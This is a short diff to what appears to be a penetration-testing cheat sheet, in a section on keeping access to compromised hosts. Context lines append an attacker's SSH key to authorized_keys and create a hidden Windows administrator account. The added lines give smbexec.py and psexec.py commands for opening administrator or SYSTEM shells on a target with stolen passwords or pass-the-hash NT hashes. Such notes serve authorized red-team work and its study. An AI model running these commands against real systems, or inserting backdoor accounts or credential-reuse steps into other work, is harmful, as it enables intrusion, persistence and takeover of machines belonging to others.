@@ -822,10 +822,17 @@ echo "PUB_KEY_CONTENT" >> ~/.ssh/authorized_keys
 ```
 #### Windows
 ```powershell
-# Inject admin group user
+# 1. Inject admin group user
 net user tmp PW /add
 net localgroup Administrator tmp /add
 # Then use winrm/rdp to access if available
+# 2. If you own the admin creds/hash
+# smbexec.py for administrator shell
+smbexec.py DOMAIN/ADMIN_USERNAME:ADMIN_PASSWORD@TARGET_IP
+smbexec.py DOMAIN/ADMIN_USERNAME@TARGET_IP -hashes NTHASH:NTHASH
+# psexec.py for system shell
+psexec.py DOMAIN/ADMIN_USERNAME:ADMIN_PASSWORD@TARGET_IP
+psexec.py DOMAIN/ADMIN_USERNAME@TARGET_IP -hashes NTHASH:NTHASH
 ```
 
 ## 6. Pivoting and port forwarding
